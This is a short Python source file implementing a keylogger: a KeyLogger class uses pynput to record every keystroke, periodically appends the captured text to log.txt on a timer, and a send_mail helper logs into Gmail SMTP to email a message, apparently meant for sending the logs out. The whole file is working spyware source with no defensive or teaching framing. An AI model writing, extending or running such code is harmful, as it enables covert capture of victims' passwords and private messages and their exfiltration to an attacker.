import os

from pynput.keyboard import Listener
import threading
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


class KeyLogger:
    def __init__(self, time_save):
        self.log = ''
        self.time_save = time_save

    def append_to_log(self, string):
        self.log += string

    def write_to_file(self):
        with open("log.txt", "a") as f:
            f.write(self.log + '\n')

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '

        self.append_to_log(current_key)

    def report(self):
        self.write_to_file()
        self.log = ''
        timer = threading.Timer(self.time_save, self.report)
        timer.start()

    def start(self):
        keyboard_listener = Listener(on_press=self.process_key_press)
        with keyboard_listener as kl:
            self.report()
            kl.join()


# my_first_keylogger = KeyLogger(3600)
# my_first_keylogger.start()
#



















